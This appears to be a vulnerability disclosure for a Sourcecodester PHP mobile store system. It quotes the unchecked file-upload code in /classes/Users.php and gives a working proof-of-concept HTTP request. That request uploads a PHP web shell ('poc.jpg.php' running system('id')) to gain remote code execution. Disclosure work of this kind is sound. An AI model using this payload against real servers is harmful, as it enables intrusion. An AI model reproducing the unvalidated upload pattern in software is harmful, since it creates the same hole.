# Sourcecodester / Mobile Management Store - Remote Code Execution via Arbitrary File Upload

## Vendor Homepage:
> https://www.sourcecodester.com/php/14924/online-mobile-store-management-system-using-php-free-source-code.html

## Affected Component
> /classes/Users.php

## Code
```php
    if(isset($_FILES['img']) && $_FILES['img']['tmp_name'] != ''){
				$fname = 'uploads/'.strtotime(date('y-m-d H:i')).'_'.$_FILES['img']['name'];
				$move = move_uploaded_file($_FILES['img']['tmp_name'],'../'. $fname);
				if($move){
					$data .=" , avatar = '{$fname}' ";
					if(isset($_SESSION['userdata']['avatar']) && is_file('../'.$_SESSION['userdata']['avatar']))
						unlink('../'.$_SESSION['userdata']['avatar']);
				}
		}
```

## Proof of Concept
**HTTP Request Example**
``` http request
POST /classes/Users.php?f=save HTTP/1.1
Host: [REDACTED]
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymhWvX5adRSJfQfpR
Cookie: PHPSESSID=[REDACTED]


------WebKitFormBoundarymhWvX5adRSJfQfpR
Content-Disposition: form-data; name="id"

1
------WebKitFormBoundarymhWvX5adRSJfQfpR
Content-Disposition: form-data; name="firstname"

Adminstrator
------WebKitFormBoundarymhWvX5adRSJfQfpR
Content-Disposition: form-data; name="lastname"

Admin
------WebKitFormBoundarymhWvX5adRSJfQfpR
Content-Disposition: form-data; name="username"

admin
------WebKitFormBoundarymhWvX5adRSJfQfpR
Content-Disposition: form-data; name="password"


------WebKitFormBoundarymhWvX5adRSJfQfpR
Content-Disposition: form-data; name="img"; filename="poc.jpg.php"
Content-Type: image/jpeg

<?php echo system('id'); ?>

------WebKitFormBoundarymhWvX5adRSJfQfpR--
```

## Screenshot
![image](https://github.com/vanitashtml/CVE-Dumps/assets/161225596/9b596447-a55a-4a7a-9e94-8797ebf6de08)

## **Credits**
> [Russel James Avenido](https://github.com/lucishtml)
